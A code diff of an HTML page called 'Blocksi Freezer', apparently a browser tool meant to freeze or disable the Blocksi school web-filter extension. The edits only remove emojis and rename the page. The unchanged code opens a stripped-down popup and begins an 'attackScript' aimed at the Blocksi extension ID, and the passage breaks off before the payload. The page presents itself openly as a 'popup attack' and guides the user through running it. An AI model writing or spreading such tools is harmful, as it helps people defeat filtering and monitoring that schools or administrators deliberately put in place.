@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Turbo Blocksi Freezer</title>
+  <title>Blocksi Freezer</title>
   <style>
     body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 20px; text-align: center; }
     button { background: #da3633; color: white; border: none; padding: 15px 30px; font-size: 20px; cursor: pointer; border-radius: 4px; }
@@ -10,19 +10,19 @@
   </style>
 </head>
 <body>
-  <h1>⚡ Turbo Blocksi Freezer</h1>
+  <h1>Blocksi Freezer</h1>
   <p>Opens a persistent popup. Close this main tab safely after clicking.</p>
-  <button id="startBtn">🔥 LAUNCH POPUP ATTACK</button>
+  <button id="startBtn">LAUNCH POPUP ATTACK</button>
   <p class="note" id="status">Click the button above.</p>
 
   <script>
     document.getElementById('startBtn').addEventListener('click', function() {
       const popup = window.open('about:blank', '_blank', 'popup=1,menubar=no,toolbar=no,location=no,status=no,resizable=no,scrollbars=no,width=400,height=150');
       if (!popup) {
-        document.getElementById('status').innerHTML = '⚠️ Popup blocked! Please allow popups for this site and try again.';
+        document.getElementById('status').innerHTML = 'Popup blocked! Please allow popups for this site and try again.';
         return;
       }
-      document.getElementById('status').innerHTML = '✅ Popup launched! You can close this tab now.';
+      document.getElementById('status').innerHTML = 'Popup launched! You can close this tab now.';
 
       const attackScript = `
         const BLOCKSI_ID = 'ghlpmldmjjhmdgmneoaibbegkjjbonbk';
